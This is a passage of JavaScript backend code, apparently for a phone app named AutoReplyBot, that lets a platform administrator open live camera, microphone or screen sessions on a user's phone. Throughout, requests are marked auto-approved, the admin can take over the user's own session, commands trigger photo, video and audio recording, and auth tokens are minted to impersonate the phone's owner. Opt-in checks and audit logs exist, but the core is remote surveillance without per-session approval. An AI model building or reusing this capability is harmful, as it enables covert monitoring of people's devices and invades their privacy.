    PLATFORM_ADMIN_CLIENT_ID,
    action,
    payload || {},
    null
  );
  await writeAdminAudit({
    action: "ADMIN_MODULE_COMMAND",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    moduleAction: action,
    commandId: cmd.commandId,
  });
  return cmd;
}

/**
 * Start live session as Platform Admin without touching user's trusted browsers.
 * @param {{ forceReplace?: boolean, capabilities?: string[], quality?: string }} opts
 */
export async function startAdminLiveSession(ownerUid, deviceId, opts, admin) {
  const device = await requireDevice(ownerUid, deviceId);
  if (!isRemoteControlReady(device)) {
    const err = new Error(
      "Remote control is disabled on this phone. Ask the user to enable Remote Control in the app, then retry."
    );
    err.code = "REMOTE_DISABLED";
    err.howTo =
      "On the phone: open AutoReplyBot → Remote Control → turn on. No change needed to their paired browsers.";
    throw err;
  }

  await ensureAdminTrustedClient(ownerUid, admin.email);

  const caps = Array.isArray(opts.capabilities) && opts.capabilities.length
    ? opts.capabilities.map(String)
    : ["camera", "microphone"];
  const wantCamera = caps.includes("camera");
  const wantMic = caps.includes("microphone");
  const wantScreen = caps.includes("screenMirror");
  if (!wantCamera && !wantMic && !wantScreen) {
    const err = new Error("Select camera, microphone, and/or screenMirror");
    err.code = "BAD_CAPABILITIES";
    throw err;
  }
  const sessionKind = wantScreen && !wantCamera ? "screen" : "camera";
  const quality = String(opts.quality || "auto").slice(0, 40);
  const fps = Math.min(60, Math.max(15, Number(opts.fps || 30)));

  const active = await listActiveSessions(ownerUid, deviceId, sessionKind);
  const userOwned = active.filter((s) => s.clientId !== PLATFORM_ADMIN_CLIENT_ID);
  if (userOwned.length && !opts.forceReplace) {
    const err = new Error(
      `This device already has an active ${sessionKind} session from the user’s browser. Starting yours would interrupt them.`
    );
    err.code = "USER_SESSION_ACTIVE";
    err.howTo =
      "Wait until they end the session, or retry with Take over (forceReplace) — that ends only the same-type live session on the phone. Their paired browsers and other modules stay intact.";
    err.activeSessions = userOwned;
    throw err;
  }

  if (wantCamera && !isDeviceCameraReady(device)) {
    const err = new Error("Camera permission is off on the phone.");
    err.code = "CAMERA_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Camera → Allow.";
    throw err;
  }
  if (wantMic && !isDeviceMicReady(device)) {
    const err = new Error("Microphone permission is off on the phone.");
    err.code = "MIC_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Microphone → Allow.";
    throw err;
  }

  await endActiveSessionsForDevice(ownerUid, deviceId, "replaced_by_admin", sessionKind);

  const now = Date.now();
  const sessionId = randomBytes(16).toString("hex");
  const requestId = randomBytes(16).toString("hex");
  const expiresAt = now + REQUEST_TTL_MS;
  const androidState = R.ANDROID_STATE_TAP_REQUIRED || "tap_required";

  const sessionDoc = {
    sessionId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    status: "connecting",
    startedAt: now,
    endedAt: 0,
    selectedCamera: wantCamera ? "front" : "none",
    microphoneEnabled: wantMic,
    flashlightEnabled: false,
    quality,
    fps,
    terminationReason: "",
    ownerUid,
    autoApproved: true,
    androidStartupState: androidState,
    requestId,
    sessionKind,
    startedByPlatformAdmin: true,
    adminEmail: admin.email || "",
  };
  const requestDoc = {
    requestId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    requestedCapabilities: caps,
    status: "approved",
    createdAt: now,
    expiresAt,
    approvedAt: now,
    rejectedAt: 0,
    ownerUid,
    preferredQuality: quality,
    fps,
    sessionId,
    autoApproved: true,
    androidStartupState: androidState,
    sessionKind,
    startedByPlatformAdmin: true,
  };

  await userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId).set(sessionDoc);
  await userRoot(ownerUid).collection(R.COL_SESSION_REQUESTS).doc(requestId).set(requestDoc);

  // Must match normal user /api/device/session/request FCM shape.
  // Existing APK rejects payloads missing clientId/requestId (RemoteFcmPayload).
  let pushSent = false;
  const fcmToken = String(device.fcmToken || "").trim();
  if (fcmToken) {
    try {
      await getMessaging().send({
        token: fcmToken,
        data: {
          type: "session_auto_start",
          requestId,
          sessionId,
          deviceId,
          clientId: PLATFORM_ADMIN_CLIENT_ID,
          clientName: "Platform Admin",
          expiresAt: String(expiresAt),
          cameraEnabled: wantCamera ? "1" : "0",
          microphoneEnabled: wantMic ? "1" : "0",
          sessionKind,
          screenMirror: wantScreen ? "1" : "0",
        },
        android: { priority: "high" },
      });
      pushSent = true;
    } catch (pushErr) {
      console.warn("Admin FCM auto-start send failed", pushErr?.message || pushErr);
    }
  }

  await writeAuditLog(ownerUid, {
    action: R.AUDIT_SESSION_AUTO_AUTHORIZED || "SESSION_AUTO_AUTHORIZED",
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    result: "ok",
    metadata: { sessionId, requestId, by: "platform_admin", admin: admin.email },
  });
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    sessionId,
    sessionKind,
    forceReplace: Boolean(opts.forceReplace),
  });

  // Short-lived custom token so admin browser can read/write WebRTC signals as owner.
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });

  return {
    ok: true,
    sessionId,
    requestId,
    sessionKind,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    pushSent,
    androidState,
    iceServers: buildIceServers({ includeTurn: true }),
    customToken,
    notes: wantScreen
      ? "Phone must accept Android screen-capture consent. Tap the phone notification if cast does not open. User browsers stay paired."
      : pushSent
        ? "Request authorized. Tap the phone notification if live view does not start (same as user panel)."
        : "Push not delivered — open the phone app / Remote Control once, then tap Connect again. User browsers stay paired.",
  };
}

const LIVE_SESSION_ACTIONS = new Set([
  "END_SESSION",
  "SWITCH_CAMERA",
  "SET_CAMERA_FRONT",
  "SET_CAMERA_BACK",
  "TORCH_ON",
  "TORCH_OFF",
  "MIC_MUTE",
  "MIC_UNMUTE",
  "CAPTURE_PHOTO",
  "START_VIDEO_RECORDING",
  "STOP_VIDEO_RECORDING",
  "START_AUDIO_RECORDING",
  "STOP_AUDIO_RECORDING",
  "SET_QUALITY",
  "PING_DEVICE",
]);

/**
 * Write a live-session command the existing APK already listens for
 * (users/{uid}/commands) — same path as the normal user website.
 * Does not change user panel behavior.
 */
export async function sendAdminLiveCommand(ownerUid, deviceId, sessionId, action, admin) {
  const act = String(action || "").trim().toUpperCase();
  if (!LIVE_SESSION_ACTIONS.has(act)) {
    const err = new Error(`Unsupported live action: ${act}`);
    err.code = "BAD_ACTION";
    throw err;
  }
  await requireDevice(ownerUid, deviceId);
  const sid = String(sessionId || "").trim();
  if (!sid || !/^[A-Za-z0-9_-]{1,128}$/.test(sid)) {
    const err = new Error("Valid sessionId required");
    err.code = "BAD_SESSION";
    throw err;
  }
  const sessionSnap = await userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sid).get();
  if (!sessionSnap.exists) {
    const err = new Error("Session not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const s = sessionSnap.data() || {};
  if (String(s.deviceId || "") !== deviceId) {
    const err = new Error("Session/device mismatch");
    err.code = "BAD_REQUEST";
    throw err;
  }

  if (act === "END_SESSION") {
    return endAdminLiveSession(ownerUid, deviceId, sid, admin);
  }

  const now = Date.now();
  const commandId = randomBytes(16).toString("hex");
  await userRoot(ownerUid)
    .collection(R.COL_COMMANDS)
    .doc(commandId)
    .set({
      commandId,
      sessionId: sid,
      deviceId,
      action: act,
      createdAt: now,
      expiresAt: now + 60_000,
      status: "pending",
      ownerUid,
      fromPlatformAdmin: true,
    });

  await writeAdminAudit({
    action: "ADMIN_LIVE_COMMAND",
    targetUid: ownerUid,
    deviceId,
    sessionId: sid,
    adminUid: admin.uid,
    adminEmail: admin.email,
    liveAction: act,
    commandId,
  });

  return { ok: true, commandId, action: act, sessionId: sid };
}

export async function endAdminLiveSession(ownerUid, deviceId, sessionId, admin) {
  const ref = userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId);
  const snap = await ref.get();
  if (!snap.exists) {
    const err = new Error("Session not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (String(data.deviceId || "") !== deviceId) {
    const err = new Error("Session/device mismatch");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const now = Date.now();
  await ref.set(
    {
      status: "ended",
      endedAt: now,
      terminationReason: "admin_ended",
      endReason: "admin_ended",
    },
    { merge: true }
  );
  // Same command path the user website uses so the existing APK stops capture.
  try {
    const commandId = randomBytes(16).toString("hex");
    await userRoot(ownerUid).collection(R.COL_COMMANDS).doc(commandId).set({
      commandId,
      sessionId,
      deviceId,
      action: "END_SESSION",
      createdAt: now,
      expiresAt: now + 60_000,
      status: "pending",
      ownerUid,
      fromPlatformAdmin: true,
    });
  } catch {
    /* session status end is enough for most builds */
  }
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION_END",
    targetUid: ownerUid,
    deviceId,
    sessionId,
    adminUid: admin.uid,
    adminEmail: admin.email,
  });
  return { ok: true };
}

/** Custom token for Firestore signaling only (admin already authenticated). */
export async function createOwnerImpersonationToken(ownerUid, admin) {
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });
  return {
    customToken,
    ownerUid,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    iceServers: buildIceServers({ includeTurn: true }),
  };
}
